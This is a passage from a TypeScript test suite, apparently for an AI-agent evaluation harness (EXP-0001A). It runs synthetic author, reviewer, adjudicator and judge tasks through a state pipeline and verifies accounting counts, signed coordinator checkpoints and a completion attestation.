      attemptId: "attempt-subscription-probe-scientific-1",
      role: "subscription_probe",
      codexTaskId: "thread-subscription-probe-scientific-1",
      threadId: "thread-subscription-probe-scientific-1",
      hostId: "local",
      isolation: {
        workspace: "projectless",
        repositoryAccess: false,
        privateApiAccess: false,
        sharedHistory: false,
        forkedFromAnotherTask: false,
        preparedCoordinates: false,
        evaluatorContext: false,
      },
      requestedModel: EXP0001A_CODEX_FROZEN_ROLE_SETTINGS.subscription_probe.requestedModel,
      requestedReasoningEffort: EXP0001A_CODEX_FROZEN_ROLE_SETTINGS.subscription_probe.requestedReasoningEffort,
      begunAt: probeBegunAt,
    });
    probeAccounting = completeExp0001aCodexTask(probeAccounting, probeCompletedAt);
    probeAccounting = terminateExp0001aCodexTask(probeAccounting, {
      terminalAt: probeTerminalAt,
      outcome: "succeeded",
      reasonCode: "availability_probe_succeeded",
    });
    const pause = scheduler.pause!;
    const resetPayload = {
      schemaVersion: "exp-0001a-chatgpt-usage-reset-observation/v1" as const,
      kind: "chatgpt-usage-reset-observation" as const,
      observationId: "usage-reset-observation-scientific-1",
      observedAt: "2026-08-30T20:50:03.000Z",
      resumedAt: "2026-08-30T20:50:04.000Z",
      priorUsageWindow: 0,
      nextUsageWindow: 1,
      source: "codex_app_host" as const,
      resetState: "availability_probe_succeeded" as const,
      priorInterruptionDigest: pause.evidenceDigest,
      subscriptionUsageBefore: "unobservable" as const,
      subscriptionUsageAfter: "unobservable" as const,
      probe: {
        role: "subscription_probe" as const,
        neutralPromptDigest: EXP0001A_SUBSCRIPTION_PROBE_PROMPT_DIGEST,
        benchmarkContentIncluded: false as const,
        accountingId: probeAccounting.accountingId,
        accountingRecordDigest: hashCanonicalJson(probeAccounting),
        codexTaskId: probeAccounting.codexTaskId,
        threadId: probeAccounting.threadId,
        hostId: probeAccounting.hostId,
        createThreadRawOutputDigest: digest("subscription-probe-create-raw"),
        terminalRawOutputDigest: digest("subscription-probe-terminal-raw"),
      },
    };
    scheduler = resumeExp0001aCodexSchedulerAfterUsageReset(scheduler, {
      observation: {
        ...resetPayload,
        authoritySignature: {
          schemaVersion: "exp-0001a-codex-authority-signature/v1",
          protocolId: "EXP-0001A",
          kind: "codex-authority-signature",
          algorithm: "Ed25519",
          keyId: "exp0001a-launch-authority-2026-08-30",
          publicKeyDigest: freeze.authority.publicKeyDigest,
          signedAt: "2026-08-30T20:50:03.500Z",
          purpose: "usage_reset_probe",
          payloadDigest: hashCanonicalJson(resetPayload),
          signatureBase64: Buffer.alloc(64, 9).toString("base64"),
        },
      },
      probeAccounting,
    });
    accountingTasks.push(probeAccounting);

    const ledger = () => exp0001aCodexAccountingLedgerSchema.parse({
      schemaVersion: "exp-0001a-codex-accounting-ledger/v1",
      protocolId: "EXP-0001A",
      frozenRoleSettings: EXP0001A_CODEX_FROZEN_ROLE_SETTINGS,
      tasks: accountingTasks,
    });
    let scientificState = createExp0001aCodexScientificState({ executionManifest, reviewPlanManifest });
    const transition = (name: Parameters<typeof performExp0001aCodexScientificTransition>[0]["transition"], at: string) => {
      scientificState = performExp0001aCodexScientificTransition({
        transition: name,
        transitionedAt: at,
        freeze,
        provisioningPlan,
        scheduler,
        accountingLedger: ledger(),
        plans: allPlans,
        lifecycles: allLifecycles,
        priorState: scientificState,
      });
    };
    const allPlans: Exp0001aCodexTaskTransportPlan[] = [...authorPlans];
    const allLifecycles: Exp0001aCodexTaskLifecycle[] = [...authorLifecycles];

    transition("seal_author_artifact_catalog", "2026-08-30T20:50:05.000Z");
    expect(scientificState.authorCatalog?.entries).toHaveLength(48);
    expect(scientificState.authorCatalog?.entries.filter((entry) => !entry.artifactComplete)).toHaveLength(1);
    transition("prepare_primary_review_work_order", "2026-08-30T20:50:06.000Z");
    expect(scientificState.primaryWorkOrder?.workItems).toHaveLength(96);

    const disagreementArtifactId = scientificState.authorCatalog!.entries.find((entry) => entry.artifactComplete)!.artifactId;
    for (const [index, item] of scientificState.primaryWorkOrder!.workItems.entries()) {
      const envelope = createExp0001aPrimaryReviewerTaskEnvelopeFromSubject({
        subject: item.subject,
        artifactPacketOrigin: availableOrigin(),
      });
      const plan = prepare(envelope, await packetReceipt(envelope), {
        transportId: `transport-primary-scientific-${String(index).padStart(3, "0")}`,
        assignmentId: item.assignmentId,
        attemptId: item.attemptId,
        subjectArtifactIds: [item.artifactId],
      });
      const accepted = !(item.artifactId === disagreementArtifactId && item.reviewerSlot === 1);
      const retained = await retainSyntheticTerminalTask(
        plan,
        frozenReviewResultForPlan(plan, accepted),
        `thread-primary-scientific-${String(index).padStart(3, "0")}`,
        syntheticTimeline(100 + index),
      );
      allPlans.push(plan);
      allLifecycles.push(retained.lifecycle);
      accountingTasks.push(finalizeExp0001aCodexTaskAccounting({
        accountingId: `accounting-primary-scientific-${String(index).padStart(3, "0")}`,
        plan,
        lifecycle: retained.lifecycle,
      }).accountingRecord);
    }
    transition("record_primary_review_results", "2026-08-31T00:30:00.000Z");
    transition("derive_disagreement_adjudication_work_order", "2026-08-31T00:30:01.000Z");
    expect(scientificState.adjudicationWorkOrder?.workItems).toHaveLength(1);

    for (const [index, item] of scientificState.adjudicationWorkOrder!.workItems.entries()) {
      const envelope = createExp0001aAdjudicatorTaskEnvelopeFromSubject({
        subject: item.subject,
        artifactPacketOrigin: availableOrigin(),
      });
      const plan = prepare(envelope, await packetReceipt(envelope), {
        transportId: `transport-adjudicator-scientific-${index}`,
        assignmentId: item.assignmentId,
        attemptId: item.attemptId,
        subjectArtifactIds: [item.artifactId],
      });
      const retained = await retainSyntheticTerminalTask(
        plan,
        frozenReviewResultForPlan(plan, true),
        `thread-adjudicator-scientific-${index}`,
        syntheticTimeline(210 + index),
      );
      allPlans.push(plan);
      allLifecycles.push(retained.lifecycle);
      accountingTasks.push(finalizeExp0001aCodexTaskAccounting({
        accountingId: `accounting-adjudicator-scientific-${index}`,
        plan,
        lifecycle: retained.lifecycle,
      }).accountingRecord);
    }
    transition("record_adjudication_results", "2026-08-31T00:30:02.000Z");
    transition("lock_blinded_classifications", "2026-08-31T00:30:03.000Z");
    const failedClassification = scientificState.classifications!.classifications.find((entry) =>
      entry.artifactId === scientificState.authorCatalog!.entries.find((catalogEntry) => !catalogEntry.artifactComplete)!.artifactId,
    );
    expect(failedClassification).toMatchObject({ accepted: false, primaryFailureClass: "FAIL_AUTHOR_NONCOMPLETION" });
    transition("prepare_pairwise_visual_work_order", "2026-08-31T00:30:04.000Z");
    expect(scientificState.pairwiseWorkOrder?.workItems).toHaveLength(24);

    for (const [index, item] of scientificState.pairwiseWorkOrder!.workItems.entries()) {
      const envelope = createExp0001aPairwiseVisualJudgeTaskEnvelopeFromSubject({
        subject: item.subject,
        artifactPacketOrigin: availableOrigin(),
      });
      const plan = prepare(envelope, await packetReceipt(envelope), {
        transportId: `transport-pairwise-scientific-${String(index).padStart(2, "0")}`,
        assignmentId: item.assignmentId,
        attemptId: item.attemptId,
        subjectArtifactIds: [item.canvas1ArtifactId, item.canvas2ArtifactId],
      });
      const retained = await retainSyntheticTerminalTask(
        plan,
        pairwiseResultForPlan(plan),
        `thread-pairwise-scientific-${String(index).padStart(2, "0")}`,
        syntheticTimeline(220 + index),
      );
      const pairwiseTerminalSummary = {
        outcome: retained.lifecycle.terminalOutcome,
        failureCode: retained.lifecycle.readReceipt?.failureCode,
        envelopeKind: plan.envelope.kind,
        traceReasons: retained.lifecycle.readReceipt?.tracePolicyReceipt?.reasons,
      };
      if (pairwiseTerminalSummary.outcome !== "succeeded" || pairwiseTerminalSummary.failureCode !== null) {
        throw new Error(`PAIRWISE_SYNTHETIC_TERMINAL_INVALID:${canonicalJson(pairwiseTerminalSummary)}`);
      }
      allPlans.push(plan);
      allLifecycles.push(retained.lifecycle);
      accountingTasks.push(finalizeExp0001aCodexTaskAccounting({
        accountingId: `accounting-pairwise-scientific-${String(index).padStart(2, "0")}`,
        plan,
        lifecycle: retained.lifecycle,
      }).accountingRecord);
    }
    transition("record_pairwise_visual_results", "2026-08-31T04:45:00.000Z");
    expect(scientificState.pairwiseResults?.results.filter((result) => result.preference === "unavailable")).toHaveLength(1);
    transition("run_cluster_aware_analysis", "2026-08-31T04:45:01.000Z");

    expect(scientificState.analysisReceipt).not.toBeNull();
    expect(scientificState.transitionDigests).toHaveLength(9);
    expect(accountingTasks).toHaveLength(170);
    expect(ledger().tasks.filter((task) => task.role === "author")).toHaveLength(48);
    expect(ledger().tasks.filter((task) => task.role === "primary_reviewer")).toHaveLength(96);
    expect(ledger().tasks.filter((task) => task.role === "adjudicator")).toHaveLength(1);
    expect(ledger().tasks.filter((task) => task.role === "pairwise_visual_judge")).toHaveLength(24);
    expect(ledger().tasks.filter((task) => task.role === "subscription_probe")).toHaveLength(1);

    const checkpointRecordedAt = "2026-08-31T04:59:00.000Z";
    const completedAt = "2026-08-31T05:00:00.000Z";
    const completionActionDigest = digest("completion-action");
    const checkpointContent = {
      schemaVersion: "exp-0001a-codex-coordinator-checkpoint/v1" as const,
      kind: "codex-coordinator-checkpoint" as const,
      protocolId: "EXP-0001A" as const,
      checkpointId: "checkpoint-synthetic-completion-1",
      recordedAt: checkpointRecordedAt,
      expiresAt: "2026-08-31T05:14:00.000Z",
      decision: "authorize_next_action" as const,
      freezeDigest: freeze.freezeDigest,
      prebriefFreezeAuthorityPayloadDigest: freeze.authority.publicKeyDigest,
      prebriefFreezeAuthoritySignatureDigest: digest("freeze-authority-signature"),
      runtimeBundleDigest: freeze.activeRuntime.bundleDigest,
      spikeEvidenceDigest: freeze.passedSpikeGate.spikeEvidenceDigest,
      spikeGateDigest: freeze.passedSpikeGate.gateDigest,
      frozenScheduleDigest: freeze.schedule.codexSchedulerDigest,
      schedulerStateDigest: hashCanonicalJson(scheduler),
      accountingLedgerDigest: hashCanonicalJson(ledger()),
      provisioningStateDigest: digest("synthetic-provisioning-state"),
      coordinatorJournalDigest: scientificState.stateDigest,
      authorizedActionDigest: completionActionDigest,
      journalPreviousEntryDigest: null,
    };
    const coordinatorCheckpoint = {
      ...checkpointContent,
      authoritySignature: {
        schemaVersion: "exp-0001a-codex-authority-signature/v1" as const,
        protocolId: "EXP-0001A" as const,
        kind: "codex-authority-signature" as const,
        algorithm: "Ed25519" as const,
        keyId: freeze.authority.keyId,
        publicKeyDigest: freeze.authority.publicKeyDigest,
        signedAt: checkpointRecordedAt,
        purpose: "coordinator_checkpoint" as const,
        payloadDigest: hashCanonicalJson(checkpointContent),
        signatureBase64: Buffer.alloc(64, 7).toString("base64"),
      },
    };
    const runtimePreflightReceipt = {
      checkedAt: checkpointRecordedAt,
      nextAction: { actionDigest: completionActionDigest },
      freezeDigest: freeze.freezeDigest,
      spikeEvidenceDigest: freeze.passedSpikeGate.spikeEvidenceDigest,
      spikeGateDigest: freeze.passedSpikeGate.gateDigest,
      schedulerStateDigest: checkpointContent.schedulerStateDigest,
      accountingLedgerDigest: checkpointContent.accountingLedgerDigest,
      provisioningStateDigest: checkpointContent.provisioningStateDigest,
      coordinatorJournalDigest: checkpointContent.coordinatorJournalDigest,
      coordinatorCheckpoint,
    };
    const completionEvidence = {
      completedAt,
      freeze,
      executionManifest,
      runtimePreflightReceipts: [runtimePreflightReceipt] as never,
      coordinatorCheckpoints: [coordinatorCheckpoint],
      scheduler,
      accountingLedger: ledger(),
      provisioningPlan,
      plans: allPlans,
      lifecycles: allLifecycles,
      scientificState,
    };
    const completion = createExp0001aCodexCompletionAttestation(completionEvidence);
    expect(completion).toMatchObject({
      schedule: { assignmentCount: 48, terminalAssignmentCount: 48 },
      transport: { begunTerminalRoleCounts: {
        author: 48, primary_reviewer: 96, adjudicator: 1, pairwise_visual_judge: 24,
      } },
      review: { adjudicationTaskCount: 1, scientificStateDigest: scientificState.stateDigest },
      accounting: { codexTaskCount: 170 },
    });
    expect(() => createExp0001aCodexCompletionAttestation({
      ...completionEvidence,
      scientificState: {
        ...scientificState,
        transitionDigests: [...scientificState.transitionDigests].reverse(),
      },
    })).toThrow(/SCIENTIFIC_TRANSITION_CHAIN_DRIFT|digest/i);
  }, 180_000);
});
